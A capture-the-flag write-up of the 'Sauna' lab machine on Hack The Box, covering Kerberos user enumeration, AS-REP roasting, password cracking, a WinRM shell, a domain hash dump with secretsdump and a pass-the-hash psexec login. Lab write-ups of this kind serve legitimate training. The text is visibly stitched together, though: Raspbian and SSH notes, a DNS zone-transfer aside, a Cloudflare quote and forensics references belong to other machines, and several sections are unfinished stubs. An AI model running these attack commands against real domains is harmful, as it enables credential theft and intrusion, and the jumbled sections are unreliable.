
![sauna badge](images/sauna/saunabadge.jpg)

Sauna is a Windows machine rated Easy on HTB.

## Port Scan

`nmap -sC -sV -p- 10.10.10.175`

```
Nmap scan report for 10.10.10.175
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2020-03-31 16:41:54 +08 for 687s
Not shown: 65515 filtered ports
Reason: 65515 no-responses
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-03-31 15:51:36Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58494/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

From the scan results, we know that this is probably an Active Directory Domain Controller.

## LDAP Recon

To find out more about this AD domain, let's run the ldap-search NSE script.

```
nmap -p 389 --script ldap-search 10.10.10.175
Nmap scan report for EGOTISTICAL-BANK.LOCAL (10.10.10.175)
Host is up (0.22s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search:
|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

The results above only show the parts that we are interested in. In particular, we uncovered a user **Hugo Smith**.

## HTTP Recon

The homepage shows the website of Egotistical Bank.

![bank homepage](images/sauna/homepage.png)

Browsing through the website and ignoring the Loren Ipsum text, we notice:

* Numerous references to roasting, sauna, and kerb (This is the CTF portion hinting at a possible vulnerability with the Kerberos setup.)
* Names of staff we can use to construct a username list.

## Enumerating Kerberos Usernames

## Generating Username List

Username Anarchy is a [nifty tool](https://github.com/urbanadventurer/username-anarchy) you can use to generate a username list.

`./username-anarchy -i staffnames.txt > usernamelist.txt`

### Testing Kerberos Authentication Server Response

As Kerberos replies differently for known and unknown usernames, it's possible to check if a username exists. An [nmap script](https://nmap.org/nsedoc/scripts/krb5-enum-users.html) is available.

`nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb='usernamelist.txt' 10.10.10.175`

```
PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users:
| Discovered Kerberos principals
|     hsmith@EGOTISTICAL-BANK.LOCAL
|     HSmith@EGOTISTICAL-BANK.LOCAL
|     FSmith@EGOTISTICAL-BANK.LOCAL
|_    fsmith@EGOTISTICAL-BANK.LOCAL
```

* username:fsmith

## AS-REP Roasting

If you're new to Keberos, this is an excellent introduction.

How it works

### Requesting For Encrypted Ticket From Authentication Server

`./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile TargetUsers.txt -format john -outputfile hashes.asreproast`

```
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

User hsmith requires Pre-Authentication so we cannot get the TGT. But we are able to obtain the TGT for fsmith.


The nmap script above and GetNPUsers use the same mechanism, so technically you can skip the separate enumeration and use Impacket directly the username list.

### Cracking Password

Next, crack the password using John The Ripper.

`john  --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast `

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
```

We now have one set of credentials.

* username: fsmith
* password: Thestrokes23

## Getting A Shell

From our port scan, we see that the port 5985 is open. It is the port for WinRM which is a remote management protocol (like SSH) for Windows.

There are several Linux tools for connecting to WinRM, but from my experience, the most reliable one is [evil-winrm](https://github.com/Hackplayers/evil-winrm).

To get a WinRM shell:

`evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23`

```
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> cat C:\Users\FSmith\Desktop\user.txt
```

**We get user.**

## Finding Autologon Password

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Use winPEAS

## Checking Active Directory Permissions

* Raspbian is a Debian-based distro. Our nmap version scan of SSH revealed Debian as well so this ties in with our assumption.
* Raspbian has [default credentials](https://www.raspberrypi.org/documentation/linux/usage/users.md). We'll try that in our exploit phase.

<details>
<summary>DNS probing did not pan out, but if you want to learn more about DNS zone transfer, expand this.</summary>

## Dumping Secrets

Impacketo

`impacket-secretsdump -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175`

```
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:68d166302ea2ec11acfcdba9f7a4ac01:::
[*] Cleaning up...
```

## Passing The Hash

Impacket-psexec get cmd

`./psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff`

From Cloudflare

> The Domain Name Systems (DNS) is the phonebook of the Internet.

Like your phone contact list, with it, you do no need to remember your friend's phone numbers. You just need to remember their names.


# Ending Thoughts

This was my first Active Directory box. It spurred me to learn a lot more about Active Directory and Kerberos.

This is the first retired box I tried, with the help of Ippsec's video. I chose it from his [easy NIX playlist](https://www.youtube.com/playlist?list=PLidcsTyj9JXJfpkDrttTdk1MNT6CDwVZF).

Before this, I rooted only one other machine: Wall (when it was active). That will be another write-up.


*References*

* https://dfir.blog/imaging-using-dcfldd/
* https://therootuser.com/2017/11/13/recover-deleted-files-using-sleuthkit/
